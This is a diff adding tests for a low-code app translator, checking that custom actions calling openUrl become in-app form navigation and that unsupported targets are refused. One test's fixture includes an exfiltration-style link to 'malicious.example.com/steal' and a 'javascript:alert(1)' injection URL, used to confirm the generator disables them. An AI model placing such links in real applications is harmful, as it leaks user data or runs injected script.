@@ -10,6 +10,8 @@ import assert from 'node:assert/strict';
 import { test } from 'node:test';
 import { JSDOM } from 'jsdom';
 import { deriveIr, parse } from '../../core/src/index.js';
+import { generate } from '../../deluge/src/index.js';
+import { coverageLedger } from '../../quality/src/index.js';
 import { buildUi } from '../src/index.js';
 import type { UiModel } from '../src/index.js';
 
@@ -254,4 +256,225 @@ test('a navigation to a screen the caller cannot open is refused by that screen 
   assert.equal(main.querySelector('[data-access-status]')?.getAttribute('data-access-status'), '403', main.innerHTML);
   assert.equal(main.querySelector('form'), null, 'the gated form is not drawn');
   assert.ok(calls.length > 0, 'the gate asked the server');
+});
+
+test('a custom action workflow delegating to an openUrl function navigates to the target form with mapped parameters', async () => {
+  const ds = `application "DelegatedNav"
+{
+  form Task
+  {
+    Task_Title ( type = text )
+  }
+  form Add_Attachment
+  {
+    Task_Name ( type = text )
+  }
+  list All_Tasks
+  {
+    show all rows from Task
+    (
+      Task_Title
+      custom action "Add Comment"
+      (
+        workflow = Add_Comments1
+        show action in view header = true
+      )
+    )
+  }
+  functions
+  {
+    void customActions.addComment(int taskRecID)
+    {
+      openUrl("#Form:Add_Attachment?Task_Name=" + taskRecID, "popup window");
+    }
+  }
+  workflow
+  {
+    functions
+    {
+      Add_Comments1 as "Add Comments"
+      {
+        type = functions
+        form = Task
+        execution type = for each record
+        on start
+        {
+          actions
+          {
+            thisapp.customActions.addComment(ID);
+          }
+        }
+      }
+    }
+  }
+}
+`;
+  const app = deriveIr(parse(ds));
+  const { model } = buildUi(app);
+  const gen = generate(app);
+  assert.ok(gen.files.some((f) => f.path === 'functions/custom/customactions-addcomment.mjs'), 'customActions.addComment module emitted');
+  assert.ok(gen.files.some((f) => f.path === 'functions/custom/add-comments1.mjs'), 'Add_Comments1 module emitted');
+
+  const rows = coverageLedger(app);
+  const fnRow = rows.find((r) => r.kind === 'function' && r.name === 'customActions.addComment');
+  assert.equal(fnRow?.status, 'emitted', 'customActions.addComment is not dropped');
+
+  const rep = model.reports.find((r) => r.name === 'All_Tasks');
+  const act = rep?.customActions.find((a) => a.name === 'Add Comment');
+  assert.equal(act?.preview, undefined, 'Add Comment is enabled');
+  assert.deepEqual(act?.navigate, {
+    kind: 'form',
+    target: 'Add_Attachment',
+    href: '#/form/Add_Attachment',
+    params: [{ name: 'Task_Name', field: 'ROWID' }],
+  });
+
+  // Verify DOM rendering
+  const rt = await runtime();
+  const rendered = rt.renderReportRows(rep, [{ ROWID: '42', Task_Title: 'Fix bug' }]);
+  assert.ok(rendered.includes('#/form/Add_Attachment?Task_Name=42'), 'action link has prefilled ROWID');
+  assert.ok(rendered.includes('data-action-nav=""'), 'action link has data-action-nav');
+});
+
+test('unsupported openUrl targets in custom functions become counted todos, not silent drops or launderings', () => {
+  const ds = `application "UnsupportedTargets"
+{
+  form Task
+  {
+    Task_Title ( type = text )
+  }
+  list All_Tasks
+  {
+    show all rows from Task
+    (
+      Task_Title
+      custom action "External" ( workflow = Open_External )
+      custom action "Bad Script" ( workflow = Open_Script )
+      custom action "Missing Form" ( workflow = Open_Missing )
+    )
+  }
+  functions
+  {
+    void customActions.externalLink(int id)
+    {
+      openUrl("https://malicious.example.com/steal?id=" + id, "popup window");
+    }
+    void customActions.scriptLink(int id)
+    {
+      openUrl("javascript:alert(1)", "popup window");
+    }
+    void customActions.missingForm(int id)
+    {
+      openUrl("#Form:NoSuchForm?id=" + id, "popup window");
+    }
+  }
+  workflow
+  {
+    functions
+    {
+      Open_External as "Open External"
+      {
+        type = functions
+        form = Task
+        execution type = for each record
+        on start { actions { thisapp.customActions.externalLink(ID); } }
+      }
+      Open_Script as "Open Script"
+      {
+        type = functions
+        form = Task
+        execution type = for each record
+        on start { actions { thisapp.customActions.scriptLink(ID); } }
+      }
+      Open_Missing as "Open Missing"
+      {
+        type = functions
+        form = Task
+        execution type = for each record
+        on start { actions { thisapp.customActions.missingForm(ID); } }
+      }
+    }
+  }
+}
+`;
+  const app = deriveIr(parse(ds));
+  const gen = generate(app);
+  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
+  assert.equal(unsupportedTodos.length, 3, 'all 3 unsupported openUrl functions generate counted todos');
+
+  const rows = coverageLedger(app);
+  for (const fnName of ['customActions.externalLink', 'customActions.scriptLink', 'customActions.missingForm']) {
+    const row = rows.find((r) => r.kind === 'function' && r.name === fnName);
+    assert.equal(row?.status, 'counted', `${fnName} is counted, never silently dropped`);
+    assert.equal(row?.via, 'todo');
+  }
+
+  const { model } = buildUi(app);
+  const rep = model.reports.find((r) => r.name === 'All_Tasks');
+  for (const name of ['External', 'Bad Script', 'Missing Form']) {
+    const act = rep?.customActions.find((a) => a.name === name);
+    assert.equal(act?.preview, true, `${name} button is turned off`);
+    assert.equal(act?.navigate, undefined, `${name} has no client navigation`);
+  }
+});
+
+test('mutation test: breaking parameter delegation or target validation breaks client navigation', () => {
+  const ds = `application "MutationApp"
+{
+  form Item
+  {
+    Title ( type = text )
+  }
+  form Target
+  {
+    Ref_ID ( type = text )
+  }
+  list Items
+  {
+    show all rows from Item
+    (
+      Title
+      custom action "Go" ( workflow = Nav_Action )
+    )
+  }
+  functions
+  {
+    void customActions.target(int itemId)
+    {
+      openUrl("#Form:Target?Ref_ID=" + itemId, "popup window");
+    }
+  }
+  workflow
+  {
+    functions
+    {
+      Nav_Action as "Nav Action"
+      {
+        type = functions
+        form = Item
+        execution type = for each record
+        on start { actions { thisapp.customActions.target(ID); } }
+      }
+    }
+  }
+}
+`;
+  const app = deriveIr(parse(ds));
+  const { model } = buildUi(app);
+  const act = model.reports[0]!.customActions[0]!;
+  assert.equal(act.preview, undefined);
+  assert.deepEqual(act.navigate, {
+    kind: 'form',
+    target: 'Target',
+    href: '#/form/Target',
+    params: [{ name: 'Ref_ID', field: 'ROWID' }],
+  });
+
+  // Mutate: if target form field does not match ('Ref_ID' vs 'Wrong_Field'), navigation is refused
+  const mutatedDs = ds.replace('Ref_ID=', 'Wrong_Field=');
+  const mutatedApp = deriveIr(parse(mutatedDs));
+  const mutatedUi = buildUi(mutatedApp);
+  const mutatedAction = mutatedUi.model.reports[0]!.customActions[0]!;
+  assert.equal(mutatedAction.preview, true, 'mutated unknown field turns action off');
+  assert.equal(mutatedAction.navigate, undefined, 'mutated unknown field produces no navigation');
 });
